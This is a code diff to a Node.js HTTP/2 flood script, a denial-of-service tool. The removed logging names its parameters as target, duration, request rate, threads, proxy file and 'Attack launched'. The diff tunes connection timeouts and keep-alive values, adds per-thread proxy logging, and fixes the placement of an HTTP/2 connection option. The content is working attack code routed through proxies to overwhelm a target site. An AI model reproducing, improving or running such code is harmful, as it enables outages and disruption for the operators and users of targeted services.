@@ -215,19 +215,11 @@ const secureOptions =
 const RESTART_DELAY = 1000;
 
 if (cluster.isMaster) {
-    console.log("Target: ".brightYellow + process.argv[2]);
-    console.log("Duration: ".brightYellow + process.argv[3] + " seconds");
-    console.log("Rate: ".brightYellow + process.argv[4] + " req/s");
-    console.log("Threads: ".brightYellow + process.argv[5]);
-    console.log("Proxy File: ".brightYellow + process.argv[6]);
-    console.log("Attack launched".brightRed);
-
     const restartScript = () => {
         for (const id in cluster.workers) {
             cluster.workers[id].kill();
         }
 
-        console.log(`Restarting in ${RESTART_DELAY} ms...`.brightCyan);
         setTimeout(() => {
             for (let counter = 1; counter <= args.threads; counter++) {
                 cluster.fork();
@@ -242,7 +234,6 @@ if (cluster.isMaster) {
         const ramPercentage = (usedRAM / totalRAM) * 100;
 
         if (ramPercentage >= MAX_RAM_PERCENTAGE) {
-            console.log('Max RAM usage reached: '.yellow + ramPercentage.toFixed(2) + '%');
             restartScript();
         }
     };
@@ -267,8 +258,8 @@ if (cluster.isMaster) {
         port: options.port,
     });
 
-    connection.setTimeout(options.timeout * 10000);
-    connection.setKeepAlive(true, 10000);
+    connection.setTimeout(options.timeout * 5000);
+    connection.setKeepAlive(true, 5000);
     connection.setNoDelay(true)
     connection.on("connect", () => {
        connection.write(buffer);
@@ -520,12 +511,13 @@ let headers = {
      host: parsedProxy[0],
      port: ~~parsedProxy[1],
      address: parsedTarget.host + ":443",
-     timeout: 2
+     timeout: 5
  };
+ console.log(`Thread ${cluster.worker.id} connecting to proxy ${proxyAddr}`);
  Socker.HTTP(proxyOptions, (connection, error) => {
     if (error) return
 
-    connection.setKeepAlive(true, 10000);
+    connection.setKeepAlive(true, 5000);
     connection.setNoDelay(true)
 
     const settings = {
@@ -556,7 +548,7 @@ let headers = {
 
     tlsConn.allowHalfOpen = true;
     tlsConn.setNoDelay(true);
-    tlsConn.setKeepAlive(true, 10000);
+    tlsConn.setKeepAlive(true, 5000);
     tlsConn.setMaxListeners(0);
 
     const client = http2.connect(parsedTarget.href, {
@@ -567,8 +559,8 @@ let headers = {
         initialWindowSize: 15564991,
         maxFrameSize : 16384,
     },
-});
 createConnection: () => tlsConn,
+});
 client.settings({
   headerTableSize: 65536,
   maxHeaderListSize : 32768,
@@ -606,7 +598,7 @@ const request = client.request({
                
 
            }
-       }, 500);
+       }, 1000);
     });
     client.on("close", () => {
       client.destroy();
